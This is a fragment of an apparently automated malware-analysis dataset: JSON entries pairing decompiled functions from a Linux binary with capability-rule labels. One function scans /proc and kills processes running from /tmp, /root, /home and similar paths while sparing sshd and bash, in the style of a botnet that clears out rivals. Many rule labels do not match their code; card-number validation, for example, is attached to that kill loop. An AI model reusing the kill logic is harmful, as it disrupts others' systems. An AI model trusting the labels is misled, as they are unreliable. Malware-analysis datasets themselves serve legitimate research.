        "decompiled_code": "\nint32_t fcn.0040864c(ulong arg1, uint *arg2)\n\n{\n    int32_t iVar1;\n    ulong arg1_00;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar uStack56;\n    uchar auStack55 [31];\n    \n    iVar1 = fcn.004069c8(arg1, 0x5401, &uStack72);\n    if (iVar1 == 0) {\n        *arg2 = uStack72;\n        arg2[1] = uStack68;\n        arg2[2] = uStack64;\n        arg2[3] = uStack60;\n        *(arg2 + 4) = uStack56;\n        arg1_00 = fcn.0040b9d0(arg2 + 0x11, auStack55, 0x13);\n        fcn.00408200(arg1_00, 0, 0xd);\n    }\n    return iVar1;\n}\n",
        "token_count": 224
    },
    "00409b18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.00409b18(void)\n\n{\n    uchar auStack56 [44];\n    int32_t iStack12;\n    \n    fcn.0040a6b1(auStack56, fcn.0040a6ae, 0x50f340);\n    fcn.0040a6ae(0x50f340);\n    fcn.00409d20(0x50f380, &iStack12);\n    fcn.0040a6b1(auStack56, 1);\n    return iStack12;\n}\n",
        "token_count": 123
    },
    "0040bdb4": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nbool fcn.0040bdb4(int64_t arg1, ulong arg2)\n\n{\n    return (*(arg1 + (arg2 + -1 >> 6) * 8) & 1 << (arg2 + -1 & 0x3f)) != 0;\n}\n",
        "token_count": 62
    },
    "0040bdd4": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nulong fcn.0040bdd4(int64_t arg1, ulong arg2)\n\n{\n    uint64_t *puVar1;\n    \n    puVar1 = arg1 + (arg2 + -1 >> 6) * 8;\n    *puVar1 = *puVar1 | 1 << (arg2 + -1 & 0x3f);\n    return 0;\n}\n",
        "token_count": 85
    },
    "004055a0": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nvoid fcn.004055a0(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *0x50f51c << 0xb ^ *0x50f51c;\n    *0x50f51c = *0x50f520;\n    *0x50f520 = *0x50f524;\n    *0x50f524 = *0x50f528;\n    *0x50f528 = uVar1 >> 8 ^ uVar1 ^ *0x50f528 ^ *0x50f528 >> 0x13;\n    return;\n}\n",
        "token_count": 134
    },
    "00405630": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nint32_t fcn.00405630(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    \n    *0x50f51c = *0x50f51c << 0xb ^ *0x50f51c;\n    uVar1 = *0x50f51c >> 8 ^ *0x50f51c ^ *0x50f528 ^ *0x50f528 >> 0x13;\n    *0x50f51c = *0x50f520;\n    *0x50f520 = *0x50f524;\n    *0x50f524 = *0x50f528;\n    *0x50f528 = uVar1;\n    return arg1 + 1 + uVar1 % (arg2 - arg1);\n}\n",
        "token_count": 179
    },
    "0040ba2c": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint64_t * fcn.0040ba2c(uint64_t *arg1, ulong noname_1, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t *puVar3;\n    \n    for (; (arg3 != 0 && ((arg1 & 7) != 0)); arg1 = arg1 + 1) {\n        if (*arg1 == noname_1) {\n            return arg1;\n        }\n        arg3 = arg3 - 1;\n    }\n    uVar2 = CONCAT11(noname_1, noname_1) << 0x10 | CONCAT11(noname_1, noname_1);\n    do {\n        if (arg3 < 8) {\n            while( true ) {\n                arg3 = arg3 - 1;\n                if (arg3 == 0xffffffffffffffff) {\n                    return NULL;\n                }\n                if (*arg1 == noname_1) break;\n                arg1 = arg1 + 1;\n            }\n            return arg1;\n        }\n        uVar1 = (uVar2 << 0x20 | uVar2) ^ *arg1;\n        if (((uVar1 + 0x7efefefefefefeff ^ ~uVar1) & 0x8101010101010100) != 0) {\n            if (*arg1 == noname_1) {\n                return arg1;\n            }\n            puVar3 = arg1 + 1;\n            if ((((*(arg1 + 1) == noname_1) || (puVar3 = arg1 + 2,  *(arg1 + 2) == noname_1)) ||\n                (puVar3 = arg1 + 3,  *(arg1 + 3) == noname_1)) ||\n               (((puVar3 = arg1 + 4,  *(arg1 + 4) == noname_1 || (puVar3 = arg1 + 5,  *(arg1 + 5) == noname_1)) ||\n                (puVar3 = arg1 + 6,  *(arg1 + 6) == noname_1)))) {\n                return puVar3;\n            }\n            if (*(arg1 + 7) == noname_1) {\n                return arg1 + 7;\n            }\n        }\n        arg3 = arg3 - 8;\n        arg1 = arg1 + 1;\n    } while( true );\n}\n",
        "token_count": 541
    },
    "0040bb1c": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint64_t * fcn.0040bb1c(int64_t arg1, ulong noname_1, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t *puVar2;\n    uint64_t *puVar3;\n    uint64_t uVar4;\n    \n    puVar2 = arg1 + arg3;\n    while ((arg3 != 0 && ((puVar2 & 7) != 0))) {\n        puVar2 = puVar2 + -1;\n        if (*puVar2 == noname_1) {\n            return puVar2;\n        }\n        arg3 = arg3 - 1;\n    }\n    uVar4 = CONCAT11(noname_1, noname_1) << 0x10 | CONCAT11(noname_1, noname_1);\n    do {\n        if (arg3 < 8) {\n            do {\n                arg3 = arg3 - 1;\n                if (arg3 == 0xffffffffffffffff) {\n                    return NULL;\n                }\n                puVar2 = puVar2 + -1;\n            } while (*puVar2 != noname_1);\n            return puVar2;\n        }\n        puVar3 = puVar2 + -1;\n        uVar1 = (uVar4 << 0x20 | uVar4) ^ *puVar3;\n        if (((uVar1 + 0x7efefefefefefeff ^ ~uVar1) & 0x8101010101010100) != 0) {\n            if (*(puVar2 + -1) == noname_1) {\n                return puVar2 + -1;\n            }\n            if (*(puVar2 + -2) == noname_1) {\n                return puVar2 + -2;\n            }\n            if (*(puVar2 + -3) == noname_1) {\n                return puVar2 + -3;\n            }\n            if (*(puVar2 + -4) == noname_1) {\n                return puVar2 + -4;\n            }\n            if (*(puVar2 + -5) == noname_1) {\n                return puVar2 + -5;\n            }\n            if (*(puVar2 + -6) == noname_1) {\n                return puVar2 + -6;\n            }\n            if (*(puVar2 + -7) == noname_1) {\n                return puVar2 + -7;\n            }\n            if (*puVar3 == noname_1) {\n                return puVar3;\n            }\n        }\n        arg3 = arg3 - 8;\n        puVar2 = puVar3;\n    } while( true );\n}\n",
        "token_count": 579
    },
    "0040c110": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint64_t * fcn.0040c110(uint64_t *arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    uint64_t *puVar4;\n    char in_SIL;\n    \n    for (; (arg1 & 7) != 0; arg1 = arg1 + 1) {\n        if (*arg1 == in_SIL) {\n            return arg1;\n        }\n    }\n    uVar3 = CONCAT11(in_SIL, in_SIL) << 0x10 | CONCAT11(in_SIL, in_SIL);\n    while( true ) {\n        do {\n            puVar2 = arg1;\n            uVar1 = (uVar3 << 0x20 | uVar3) ^ *puVar2;\n            arg1 = puVar2 + 1;\n        } while (((uVar1 + 0x7efefefefefefeff ^ ~uVar1) & 0x8101010101010100) == 0);\n        if (*puVar2 == in_SIL) break;\n        puVar4 = puVar2 + 1;\n        if ((((*(puVar2 + 1) == in_SIL) || (puVar4 = puVar2 + 2,  *(puVar2 + 2) == in_SIL)) ||\n            (puVar4 = puVar2 + 3,  *(puVar2 + 3) == in_SIL)) ||\n           (((puVar4 = puVar2 + 4,  *(puVar2 + 4) == in_SIL || (puVar4 = puVar2 + 5,  *(puVar2 + 5) == in_SIL)) ||\n            (puVar4 = puVar2 + 6,  *(puVar2 + 6) == in_SIL)))) {\n            return puVar4;\n        }\n        if (*(puVar2 + 7) == in_SIL) {\n            return puVar2 + 7;\n        }\n    }\n    return puVar2;\n}\n",
        "token_count": 452
    },
    "00407a18": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\nuchar  [16] fcn.00407a18(char **arg1, char *arg2)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    ulong uStack24;\n    \n    fcn.00408200(arg1, 0, 0x100);\n    *(arg1 + 0x1c) = *(arg1 + 0x1c) + -1;\n    puVar1 = arg1 + 0x2c;\n    *arg1 = arg2;\n    iVar4 = 9;\n    do {\n        *puVar1 = 8;\n        puVar1 = puVar1 + 1;\n        iVar4 = iVar4 + -1;\n        pcVar3 = arg2;\n    } while (iVar4 != 0);\ncode_r0x00407a7b:\n    do {\n        if (*pcVar3 == '\\0') {\n            *arg1 = arg2;\n            uVar2 = 0;\ncode_r0x00407a86:\n            return CONCAT88(uStack24, uVar2);\n        }\n        if ((*pcVar3 != '%') || (pcVar3 = pcVar3 + 1,  *pcVar3 == '%')) {\n            pcVar3 = pcVar3 + 1;\n            goto code_r0x00407a7b;\n        }\n        *arg1 = pcVar3;\n        iVar4 = fcn.00407cca(arg1);\n        if (iVar4 < 0) {\n            uVar2 = 0xffffffff;\n            goto code_r0x00407a86;\n        }\n        pcVar3 = *arg1;\n    } while( true );\n}\n",
        "token_count": 373
    },
    "0040ab04": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040ab4e)\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Removing unreachable block (ram,0x0040ab7b)\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.0040ab04(ulong arg1, ulong *arg2, int64_t arg3)\n\n{\n    uint16_t uVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    uint64_t uVar5;\n    ulong *puVar6;\n    ulong *puVar7;\n    int64_t aiStack96 [2];\n    int64_t var_48h;\n    ulong *var_3ch;\n    ulong var_30h;\n    ulong var_28h;\n    \n    var_3ch._0_4_ = arg1;\n    var_48h = arg3;\n    iVar3 = -(arg3 + 0x1eU & 0xfffffffffffffff0);\n    puVar6 = &fcn.0040ab04::var_48h + iVar3;\n    syscall();\n    var_30h = 0xffffffffffffffff;\n    puVar7 = arg2;\n    do {\n        uVar2 = var_30h;\n        if (&stack0x00000089 + iVar3 <= puVar6) {\ncode_r0x0040ac1b:\n            return puVar7 - arg2;\n        }\n        uVar5 = *(puVar6 + 2) + 7 & 0xfffffffffffffff8;\n        unique0x00003400 = puVar7 + uVar5;\n        if (arg2 + var_48h < unique0x00003400) {\n            uVar5 = var_3ch;\n            *(&stack0xffffffffffffffa0 + iVar3) = 0x40abb0;\n            fcn.0040ad30(uVar5, uVar2, 0);\n            if (puVar7 == arg2) {\n                *(&stack0xffffffffffffffa0 + iVar3) = 0x40abba;\n                puVar4 = fcn.00406f98();\n                *puVar4 = 0x16;\n                return -1;\n            }\n            goto code_r0x0040ac1b;\n        }\n        var_30h = puVar6[1];\n        *puVar7 = *puVar6;\n        uVar2 = puVar6[1];\n        *(puVar7 + 2) = uVar5;\n        puVar7[1] = uVar2;\n        *(puVar7 + 0x12) = *(puVar6 + 0x12);\n        uVar1 = *(puVar6 + 2);\n        *(&stack0xffffffffffffffa0 + iVar3) = 0x40ac02;\n        fcn.00408190(puVar7 + 0x13, puVar6 + 0x13, uVar1 - 0x13);\n        puVar6 = puVar6 + *(puVar6 + 2);\n        puVar7 = stack0xffffffffffffffc0;\n    } while( true );\n}\n",
        "token_count": 691
    },
    "0040af84": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2",
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint64_t fcn.0040af84(uint32_t **arg1, uint32_t **arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint64_t uVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    uint32_t *apuStack24 [3];\n    \n    iVar5 = 1;\n    if (arg1 == NULL || arg1 == arg2) {\n        if (arg1 == NULL) {\n            arg4 = 0xffffffffffffffff;\n            iVar5 = 0;\n            arg1 = apuStack24;\n        }\n        else {\n            iVar5 = 0;\n            arg1 = apuStack24;\n        }\n    }\n    if (arg3 <= arg4) {\n        arg4 = arg3;\n    }\n    puVar4 = *arg2;\n    uVar3 = arg4;\n    do {\n        if (uVar3 == 0) {\ncode_r0x0040affd:\n            if (arg1 != apuStack24) {\n                *arg2 = puVar4;\n            }\n            return arg4 - uVar3;\n        }\n        if (0x7f < *puVar4) {\n            puVar2 = fcn.00406f98();\n            *puVar2 = 0x54;\n            return -1;\n        }\n        cVar1 = *puVar4;\n        *arg1 = cVar1;\n        if (cVar1 == '\\0') {\n            puVar4 = NULL;\n            goto code_r0x0040affd;\n        }\n        puVar4 = puVar4 + 1;\n        uVar3 = uVar3 - 1;\n        arg1 = arg1 + iVar5;\n    } while( true );\n}\n",
        "token_count": 398
    },
    "0040875c": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00408772)\n\nulong fcn.0040875c(ulong arg1)\n\n{\n    syscall();\n    return 0x33;\n}\n",
        "token_count": 41
    },
    "004002b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004002b0(void)\n\n{\n    if (*0x50f4e0 != 0) {\n        fcn.00406a30(*0x50f4e0, 9);\n    }\n    *0x50f4e0 = 0;\n    if (*0x50f4e4 != 0) {\n        fcn.00406a30(*0x50f4e4, 9);\n    }\n    *0x50f4e4 = 0;\n    if (*0x50f4e8 != 0) {\n        fcn.00406a30(*0x50f4e8, 9);\n    }\n    *0x50f4e8 = 0;\n    if (*0x50f4ec != 0) {\n        fcn.00406a30(*0x50f4ec, 9);\n    }\n    *0x50f4ec = 0;\n    if (*0x50f4f0 != 0) {\n        fcn.00406a30(*0x50f4f0, 9);\n    }\n    *0x50f4f0 = 0;\n    if (*0x50f4f4 != 0) {\n        fcn.00406a30(*0x50f4f4, 9);\n    }\n    *0x50f4f4 = 0;\n    if (*0x50f4f8 != 0) {\n        fcn.00406a30(*0x50f4f8, 9);\n    }\n    *0x50f4f8 = 0;\n    if (*0x50f4fc == 0) {\n        *0x50f4f8 = 0;\n        *0x50f4fc = 0;\n        return;\n    }\n    fcn.00406a30(*0x50f4fc, 9);\n    *0x50f4fc = 0;\n    return;\n}\n",
        "token_count": 438
    },
    "00404180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404180(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    ulong arg1;\n    int64_t iVar3;\n    ulong in_RCX;\n    ulong arg3;\n    ulong in_R8;\n    ulong in_R9;\n    uchar auStack184 [112];\n    uchar auStack72 [32];\n    \n    arg1 = fcn.00406e14(\"/proc/\");\n    while (iVar3 = fcn.00406f08(arg1),  iVar3 != 0) {\n        uVar1 = fcn.0040a02c(iVar3 + 0x13);\n        uVar2 = fcn.00406978();\n        if (((uVar1 != uVar2) && (uVar2 = fcn.004069a0(),  uVar1 != uVar2)) && (uVar1 != 0)) {\n            fcn.00407094(auStack72, \"/proc/%d/maps\", uVar1, in_RCX, in_R8, in_R9);\n            uVar2 = fcn.00406a5c(auStack72, 0, arg3);\n            fcn.00406b00(uVar2);\n            fcn.00406924(uVar2);\n            iVar3 = fcn.00408494(auStack184, \"/usr/lib/systemd/systemd\");\n            if (((((iVar3 == 0) && (iVar3 = fcn.00408494(auStack184, \"/usr/libexec/openssh/sftp-server\"),  iVar3 == 0))\n                 && ((iVar3 = fcn.00408494(auStack184, \"/usr/bin\"),  iVar3 == 0 &&\n                     ((iVar3 = fcn.00408494(auStack184, \"/usr/sbin\"),  iVar3 == 0 &&\n                      (iVar3 = fcn.00408494(auStack184, \"/usr/lib\"),  iVar3 == 0)))))) &&\n                (((iVar3 = fcn.00408494(auStack184, \"/var/lib\"),  iVar3 == 0 &&\n                  ((((iVar3 = fcn.00408494(auStack184, \"/var/spool\"),  iVar3 == 0 &&\n                     (iVar3 = fcn.00408494(auStack184, \"/var/Condi\"),  iVar3 == 0)) &&\n                    (iVar3 = fcn.00408494(auStack184, \"sshd\"),  iVar3 == 0)) &&\n                   ((iVar3 = fcn.00408494(auStack184, \"bash\"),  iVar3 == 0 &&\n                    (iVar3 = fcn.00408494(auStack184, \"httpd\"),  iVar3 == 0)))))) &&\n                 (((iVar3 = fcn.00408494(auStack184, \"telnetd\"),  iVar3 == 0 &&\n                   ((iVar3 = fcn.00408494(auStack184, \"dropbear\"),  iVar3 == 0 &&\n                    (iVar3 = fcn.00408494(auStack184, \"ropbear\"),  iVar3 == 0)))) &&\n                  (iVar3 = fcn.00408494(auStack184, \"encoder\"),  iVar3 == 0)))))) &&\n               (((((iVar3 = fcn.00408494(auStack184, \"/tmp\"),  iVar3 != 0 ||\n                   (iVar3 = fcn.00408494(auStack184, \"/var/run/\"),  iVar3 != 0)) ||\n                  (iVar3 = fcn.00408494(auStack184, \"/mnt\"),  iVar3 != 0)) ||\n                 ((iVar3 = fcn.00408494(auStack184, \"/root\"),  iVar3 != 0 ||\n                  (iVar3 = fcn.00408494(auStack184, \"/var/tmp\"),  iVar3 != 0)))) ||\n                (((iVar3 = fcn.00408494(auStack184, \"/boot\"),  iVar3 != 0 ||\n                  ((iVar3 = fcn.00408494(auStack184, 0x40cc26),  iVar3 != 0 ||\n                   (iVar3 = fcn.00408494(auStack184, \"(deleted)\"),  iVar3 != 0)))) ||\n                 (iVar3 = fcn.00408494(auStack184, \"/home\"),  iVar3 != 0)))))) {\n                fcn.00406a30(uVar1, 9);\n            }\n        }\n        fcn.00408200(auStack184, 0, 100);\n    }\n    return;\n}\n",
        "token_count": 998
    },
    "00404430": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404430(void)\n\n{\n    *0x50f054 = fcn.00406950();\n    if (0 < *0x50f054) {\n        return;\n    }\n    do {\n        fcn.00404180();\n        fcn.0040a334(2);\n    } while( true );\n}\n",
        "token_count": 73
    },
    "00406894": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004068de)\n\nulong fcn.00406894(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    syscall();\n    return 0x48;\n}\n",
        "token_count": 48
    },
    "004069c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406a16)\n\nulong fcn.004069c8(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    syscall();\n    return 0x10;\n}\n",
        "token_count": 50
    },
    "00406a5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406aac)\n\nulong fcn.00406a5c(ulong noname_0, uint64_t arg2, ulong arg3)\n\n{\n    syscall();\n    return 2;\n}\n",
        "token_count": 52
    },
    "00406ba4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406bc7)\n// WARNING: Removing unreachable block (ram,0x00406bda)\n\nuint fcn.00406ba4(ulong noname_0, ulong arg2)\n\n{\n    syscall();\n    return 4;\n}\n",
        "token_count": 62
    },
    "00406e14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.00406e14(ulong arg1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t *arg1_00;\n    int64_t iVar5;\n    ulong in_RDX;\n    uchar auStack168 [56];\n    uint64_t uStack112;\n    \n    uVar2 = fcn.00406a5c(arg1, 0x10800, in_RDX);\n    if (uVar2 < 0) {\n        return NULL;\n    }\n    iVar3 = fcn.0040aab0(uVar2, auStack168);\n    if ((iVar3 < 0) || (iVar3 = fcn.00406894(uVar2, 2, 1),  iVar3 < 0)) {\n        puVar4 = fcn.00406f98();\n        uVar1 = *puVar4;\n        fcn.00406924(uVar2);\n        *puVar4 = uVar1;\n    }\n    else {\n        arg1_00 = fcn.00408928(0x58);\n        if (arg1_00 != NULL) {\n            *arg1_00 = uVar2;\n            *(arg1_00 + 8) = 0;\n            *(arg1_00 + 4) = 0;\n            *(arg1_00 + 2) = 0;\n            *(arg1_00 + 10) = uStack112;\n            if (uStack112 < 0x200) {\n                *(arg1_00 + 10) = 0x200;\n            }\n            iVar5 = fcn.00409190(1, *(arg1_00 + 10));\n            *(arg1_00 + 6) = iVar5;\n            if (iVar5 != 0) {\n                fcn.0040a6ae(arg1_00 + 0xc, 0);\n                return arg1_00;\n            }\n            fcn.00409817(arg1_00);\n        }\n        fcn.00406924(uVar2);\n        puVar4 = fcn.00406f98();\n        *puVar4 = 0xc;\n    }\n    return NULL;\n}\n",
        "token_count": 493
    },
    "00406fa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00406fa0(void)\n\n{\n    int64_t iStack40;\n    int64_t iStack32;\n    \n    fcn.0040aeb0(&iStack40);\n    return (iStack32 + iStack40) * 10000 & 0x7fffffffffffffff;\n}\n",
        "token_count": 69
    },
    "0040712c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040712c(uchar *arg1, uint64_t arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    uint64_t uVar2;\n    ushort uStack184;\n    uchar uStack182;\n    uint uStack180;\n    uchar *puStack176;\n    uchar *puStack168;\n    uchar *puStack160;\n    uchar *puStack152;\n    uchar *puStack144;\n    uchar *puStack136;\n    ulong uStack128;\n    uint uStack112;\n    uint uStack104;\n    uchar auStack96 [48];\n    \n    uStack180 = 0xfffffffe;\n    uStack184 = 0xd0;\n    uStack182 = 0;\n    uStack112 = 0;\n    uStack104 = 1;\n    fcn.0040725f(auStack96);\n    uVar2 = ~arg1;\n    if (arg2 < ~arg1) {\n        uVar2 = arg2;\n    }\n    uStack128 = 0;\n    puStack168 = arg1 + uVar2;\n    puStack176 = arg1;\n    puStack160 = arg1;\n    puStack152 = arg1;\n    puStack144 = arg1;\n    puStack136 = puStack168;\n    uVar1 = fcn.004073dc(&uStack184, arg3, arg4);\n    if (uVar2 != 0) {\n        if (puStack160 == puStack168) {\n            puStack160 = puStack168 + -1;\n        }\n        *puStack160 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 356
    },
    "00408190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.00408190(ulong *arg1, ulong *arg2, uint64_t arg3)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    ulong *puVar5;\n    \n    puVar5 = arg1;\n    if (0x20 < arg3) {\n        uVar4 = -arg1 & 7;\n        arg3 = arg3 - uVar4;\n        for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar5 = *arg2;\n            arg2 = arg2 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        while (-1 < arg3 - 0x20) {\n            uVar1 = arg2[1];\n            uVar2 = arg2[2];\n            uVar3 = arg2[3];\n            *puVar5 = *arg2;\n            puVar5[1] = uVar1;\n            puVar5[2] = uVar2;\n            puVar5[3] = uVar3;\n            arg2 = arg2 + 4;\n            puVar5 = puVar5 + 4;\n            arg3 = arg3 - 0x20;\n        }\n    }\n    for (; arg3 != 0; arg3 = arg3 - 1) {\n        *puVar5 = *arg2;\n        arg2 = arg2 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    return arg1;\n}\n",
        "token_count": 346
    },
    "00408494": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nchar * fcn.00408494(char *arg1, char *arg2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char cVar3;\n    char *pcVar4;\n    char cVar5;\n    char *pcVar6;\n    char *pcVar7;\n    \n    cVar2 = *arg2;\n    if (cVar2 != '\\0') {\n        arg1 = arg1 + -1;\n        do {\n            pcVar4 = arg1;\n            arg1 = pcVar4 + 1;\n            if (*arg1 == '\\0') {\n                return NULL;\n            }\n        } while (*arg1 != cVar2);\n        if (arg2[1] != '\\0') {\n            cVar3 = pcVar4[2];\n            pcVar4 = pcVar4 + 2;\n            do {\n                if (cVar3 == arg2[1]) {\n                    cVar5 = arg2[2];\n                    pcVar7 = arg2 + 2;\n                    pcVar6 = pcVar4 + 1;\n                    pcVar1 = pcVar4 + -1;\n                    cVar3 = pcVar4[1];\n                    while (cVar3 == cVar5) {\n                        if (cVar5 == '\\0') {\n                            return pcVar1;\n                        }\n                        cVar5 = pcVar7[1];\n                        if (pcVar6[1] != cVar5) break;\n                        if (cVar5 == '\\0') {\n                            return pcVar1;\n                        }\n                        pcVar6 = pcVar6 + 2;\n                        pcVar7 = pcVar7 + 2;\n                        cVar5 = *pcVar7;\n                        cVar3 = *pcVar6;\n                    }\n                    if (cVar5 == '\\0') {\n                        return pcVar1;\n                    }\n                    cVar3 = *pcVar4;\n                }\n                while (pcVar7 = pcVar4,  cVar3 != cVar2) {\n                    if (cVar3 == '\\0') {\n                        return NULL;\n                    }\n                    pcVar7 = pcVar4 + 1;\n                    if (*pcVar7 == cVar2) break;\n                    if (*pcVar7 == '\\0') {\n                        return NULL;\n                    }\n                    pcVar4 = pcVar4 + 2;\n                    cVar3 = *pcVar4;\n                }\n                pcVar4 = pcVar7 + 1;\n                cVar3 = *pcVar4;\n            } while( true );\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 550
    },
    "00408630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00408630(ulong param_1)\n\n{\n    int32_t iVar1;\n    uchar auStack72 [72];\n    \n    iVar1 = fcn.0040864c(param_1, auStack72);\n    return iVar1 == 0;\n}\n",
        "token_count": 59
    },
    "004095e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar  [16] fcn.004095e4(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong uStack40;\n    \n    uVar3 = *(arg2 + 0x6a4);\n    uVar5 = *(*(arg2 + 0x60) + 8) & 0xfffffffffffffffc;\n    iVar4 = (((uVar5 - arg1) + -0x21 + uVar3) / uVar3 - 1) * uVar3;\n    if (0 < iVar4) {\n        iVar1 = fcn.0040ae0c(0);\n        if (iVar1 == uVar5 + *(arg2 + 0x60)) {\n            fcn.0040ae0c(-iVar4);\n            iVar4 = fcn.0040ae0c(0);\n            if ((iVar4 != -1) && (iVar1 = iVar1 - iVar4,  iVar1 != 0)) {\n                *(arg2 + 0x6b8) = *(arg2 + 0x6b8) - iVar1;\n                *(*(arg2 + 0x60) + 8) = uVar5 - iVar1 | 1;\n                uVar2 = 1;\n                goto code_r0x00409675;\n            }\n        }\n    }\n    uVar2 = 0;\ncode_r0x00409675:\n    return CONCAT88(uStack40, uVar2);\n}\n",
        "token_count": 353
    },
    "0040a634": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a634(ulong arg1)\n\n{\n    uint64_t uStack24;\n    int64_t iStack16;\n    \n    uStack24 = arg1 / 1000000;\n    iStack16 = (arg1 % 1000000) * 1000;\n    fcn.0040adbc(&uStack24, 0);\n    return;\n}\n",
        "token_count": 84
    },
    "0040a91d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
